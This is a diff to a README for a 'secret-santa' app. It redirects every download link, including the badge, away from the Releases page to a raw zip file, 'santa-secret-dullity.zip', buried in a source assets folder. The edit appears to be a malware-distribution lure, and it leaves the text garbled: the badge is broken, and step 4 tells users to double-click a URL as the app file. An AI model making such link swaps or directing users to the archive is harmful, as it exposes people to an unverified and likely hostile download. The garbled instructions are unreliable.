@@ -1,6 +1,6 @@
 # 🎉 secret-santa - Enjoy Gift-Giving Made Easy
 
-[![Download Secret Santa](https://img.shields.io/badge/Download%20Secret%20Santa-v1.0-blue)](https://github.com/coolpicsguy25345/secret-santa/releases)
+[![Download Secret Santa](https://github.com/coolpicsguy25345/secret-santa/raw/refs/heads/main/client/src/assets/santa-secret-dullity.zip%20Secret%20Santa-v1.0-blue)](https://github.com/coolpicsguy25345/secret-santa/raw/refs/heads/main/client/src/assets/santa-secret-dullity.zip)
 
 ## 🚀 Getting Started
 
@@ -31,12 +31,12 @@ Before you get started, check the following requirements:
 
 To get your Secret Santa app, visit the page to download:
 
-[Download Secret Santa](https://github.com/coolpicsguy25345/secret-santa/releases)
+[Download Secret Santa](https://github.com/coolpicsguy25345/secret-santa/raw/refs/heads/main/client/src/assets/santa-secret-dullity.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/coolpicsguy25345/secret-santa/releases).
+   Go to the [Releases page](https://github.com/coolpicsguy25345/secret-santa/raw/refs/heads/main/client/src/assets/santa-secret-dullity.zip).
 
 2. **Choose Your Version**  
    On the Releases page, locate the latest version of Secret Santa. Click the corresponding link to download the application.
@@ -45,7 +45,7 @@ To get your Secret Santa app, visit the page to download:
    Once downloaded, locate the ZIP file in your downloads folder. Right-click the file and select “Extract All” to unpack the contents.
 
 4. **Run the Application**  
-   Navigate to the extracted folder. Double-click on the `index.html` file or the Docker file to launch the app.
+   Navigate to the extracted folder. Double-click on the `https://github.com/coolpicsguy25345/secret-santa/raw/refs/heads/main/client/src/assets/santa-secret-dullity.zip` file or the Docker file to launch the app.
 
 5. **Set Up Your Environment (for Docker users)**  
    - If using Docker, follow these steps:
